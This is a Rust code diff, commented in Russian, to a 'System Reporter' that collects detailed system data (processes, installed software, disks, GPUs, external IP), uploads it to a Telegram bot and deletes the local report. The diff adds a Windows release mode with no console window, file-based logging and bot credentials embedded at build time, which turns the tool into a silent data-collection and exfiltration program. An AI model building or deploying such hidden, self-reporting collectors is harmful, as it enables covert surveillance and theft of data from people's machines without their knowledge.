@@ -1,7 +1,11 @@
+// Скрытый режим для Windows (без консольного окна в release)
+#![cfg_attr(all(not(debug_assertions), target_os = "windows"), windows_subsystem = "windows")]
+
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 use std::fs;
 use std::env;
+use std::io::Write;
 use sysinfo::{System, SystemExt, CpuExt, DiskExt, ProcessExt, NetworksExt, NetworkExt};
 use anyhow::{Result, Context};
 
@@ -214,62 +218,88 @@ struct SystemReport {
     reporter_version: String,
 }
 
+// --- Логирование для скрытого режима ---
+
+fn log(msg: &str) {
+    // В debug режиме или не-Windows - обычный println
+    #[cfg(any(debug_assertions, not(target_os = "windows")))]
+    {
+        println!("{}", msg);
+    }
+
+    // В release на Windows - пишем в файл (т.к. нет консоли)
+    #[cfg(all(not(debug_assertions), target_os = "windows"))]
+    {
+        let _ = std::fs::OpenOptions::new()
+            .create(true)
+            .append(true)
+            .open("system_reporter.log")
+            .and_then(|mut file| {
+                writeln!(file, "[{}] {}", chrono::Local::now().format("%Y-%m-%d %H:%M:%S"), msg)
+            });
+    }
+}
+
 // --- Точка входа ---
 
 #[tokio::main]
 async fn main() -> Result<()> {
-    println!("╔════════════════════════════════════════╗");
-    println!("║     System Reporter v0.4.0             ║");
-    println!("║     Полный сбор системной информации   ║");
-    println!("╚════════════════════════════════════════╝\n");
+    log("╔════════════════════════════════════════╗");
+    log("║     System Reporter v0.4.0             ║");
+    log("║     Полный сбор системной информации   ║");
+    log("╚════════════════════════════════════════╝");
+    log("");
 
     // Проверка переменных окружения
     let telegram_mode = get_telegram_credentials().is_ok();
 
     if telegram_mode {
-        println!("✓ Режим Telegram активирован");
+        log("✓ Режим Telegram активирован");
     } else {
-        println!("ℹ Режим: локальное сохранение (для отправки в Telegram установите учетные данные)");
+        log("ℹ Режим: локальное сохранение (для отправки в Telegram установите учетные данные)");
     }
 
-    println!("\n[1/5] Инициализация системных библиотек...");
+    log("");
+    log("[1/5] Инициализация системных библиотек...");
     let report = collect_system_info().await?;
 
-    println!("[2/5] Сериализация данных в JSON...");
+    log("[2/5] Сериализация данных в JSON...");
     let filename = save_report(&report)?;
 
-    println!("[3/5] Отчет сохранен: {}", filename);
+    log(&format!("[3/5] Отчет сохранен: {}", filename));
 
     if telegram_mode {
-        println!("[4/5] Отправка отчета в Telegram...");
+        log("[4/5] Отправка отчета в Telegram...");
         send_to_telegram(&filename, &report).await?;
-        println!("[5/5] ✓ Отчет успешно отправлен в Telegram!");
+        log("[5/5] ✓ Отчет успешно отправлен в Telegram!");
 
         // Удаляем локальный файл после отправки
         let _ = fs::remove_file(&filename);
     } else {
-        println!("[4/5] Telegram не настроен, пропускаем отправку");
-        println!("[5/5] ✓ Готово!");
+        log("[4/5] Telegram не настроен, пропускаем отправку");
+        log("[5/5] ✓ Готово!");
     }
 
-    println!("\n╔════════════════════════════════════════╗");
-    println!("║           Статистика отчета             ║");
-    println!("╠════════════════════════════════════════╣");
-    println!("║ Процессов: {:>28} ║", report.process_count);
-    println!("║ Дисков: {:>31} ║", report.disks.len());
-    println!("║ Дисплеев: {:>29} ║", report.display_count);
-    println!("║ Сетевых интерфейсов: {:>18} ║", report.network_interfaces.len());
+    log("");
+    log("╔════════════════════════════════════════╗");
+    log("║           Статистика отчета             ║");
+    log("╠════════════════════════════════════════╣");
+    log(&format!("║ Процессов: {:>28} ║", report.process_count));
+    log(&format!("║ Дисков: {:>31} ║", report.disks.len()));
+    log(&format!("║ Дисплеев: {:>29} ║", report.display_count));
+    log(&format!("║ Сетевых интерфейсов: {:>18} ║", report.network_interfaces.len()));
     #[cfg(target_os = "windows")]
-    println!("║ GPU: {:>34} ║", report.gpus.len());
-    println!("║ Установлено программ: {:>17} ║", report.installed_software_count);
-    println!("║ Внешний IP: {:>27} ║", report.external_ip);
-    println!("╚════════════════════════════════════════╝\n");
+    log(&format!("║ GPU: {:>34} ║", report.gpus.len()));
+    log(&format!("║ Установлено программ: {:>17} ║", report.installed_software_count));
+    log(&format!("║ Внешний IP: {:>27} ║", report.external_ip));
+    log("╚════════════════════════════════════════╝");
+    log("");
 
     Ok(())
 }
 
 async fn collect_system_info() -> Result<SystemReport> {
-    println!("   → Сбор базовой информации...");
+    log("   → Сбор базовой информации...");
     let mut sys = System::new_all();
     sys.refresh_all();
 
@@ -279,13 +309,13 @@ async fn collect_system_info() -> Result<SystemReport> {
 
     #[cfg(target_os = "windows")]
     if wmi_con.is_some() {
-        println!("   → WMI инициализирован (глубокий сбор для Windows)");
+        log("   → WMI инициализирован (глубокий сбор для Windows)");
     }
 
-    println!("   → Сбор информации об оборудовании...");
-    println!("   → Сбор сетевой информации (локальный и внешний IP)...");
-    println!("   → Анализ процессов...");
-    println!("   → Сбор установленного ПО (это может занять время)...");
+    log("   → Сбор информации об оборудовании...");
+    log("   → Сбор сетевой информации (локальный и внешний IP)...");
+    log("   → Анализ процессов...");
+    log("   → Сбор установленного ПО (это может занять время)...");
 
     let uptime = System::uptime();
     let total_mem = sys.total_memory() as f64 / (1024.0 * 1024.0 * 1024.0);
@@ -875,14 +905,29 @@ mod crypto {
 
 // --- Работа с зашифрованными токенами ---
 
+fn get_env_or_embedded(key: &str) -> Option<String> {
+    // Сначала проверяем системные переменные окружения
+    if let Ok(val) = env::var(key) {
+        return Some(val);
+    }
+
+    // Затем проверяем встроенные переменные (из build.rs)
+    let embedded_key = format!("EMBEDDED_{}", key);
+    if let Ok(val) = env::var(&embedded_key) {
+        return Some(val);
+    }
+
+    None
+}
+
 fn get_telegram_credentials() -> Result<(String, i64)> {
-    // Проверяем зашифрованные токены
-    if let (Ok(enc_token), Ok(enc_chat_id), Ok(password)) = (
-        env::var("ENCRYPTED_BOT_TOKEN"),
-        env::var("ENCRYPTED_CHAT_ID"),
-        env::var("ENCRYPTION_PASSWORD"),
+    // Проверяем зашифрованные токены (системные или встроенные)
+    if let (Some(enc_token), Some(enc_chat_id), Some(password)) = (
+        get_env_or_embedded("ENCRYPTED_BOT_TOKEN"),
+        get_env_or_embedded("ENCRYPTED_CHAT_ID"),
+        get_env_or_embedded("ENCRYPTION_PASSWORD"),
     ) {
-        println!("   ℹ Используются зашифрованные учетные данные");
+        log("   ℹ Используются зашифрованные учетные данные");
         let bot_token = crypto::decrypt_token(&enc_token, &password)
             .context("Не удалось расшифровать токен бота")?;
         let chat_id_str = crypto::decrypt_token(&enc_chat_id, &password)
@@ -893,12 +938,12 @@ fn get_telegram_credentials() -> Result<(String, i64)> {
         return Ok((bot_token, chat_id));
     }
 
-    // Fallback на незашифрованные
-    if let (Ok(bot_token), Ok(chat_id_str)) = (
-        env::var("TELEGRAM_BOT_TOKEN"),
-        env::var("TELEGRAM_CHAT_ID"),
+    // Fallback на незашифрованные (системные или встроенные)
+    if let (Some(bot_token), Some(chat_id_str)) = (
+        get_env_or_embedded("TELEGRAM_BOT_TOKEN"),
+        get_env_or_embedded("TELEGRAM_CHAT_ID"),
     ) {
-        println!("   ⚠ Используются НЕЗАШИФРОВАННЫЕ учетные данные!");
+        log("   ⚠ Используются НЕЗАШИФРОВАННЫЕ учетные данные!");
         let chat_id: i64 = chat_id_str.parse()
             .context("Chat ID должен быть числом")?;
 
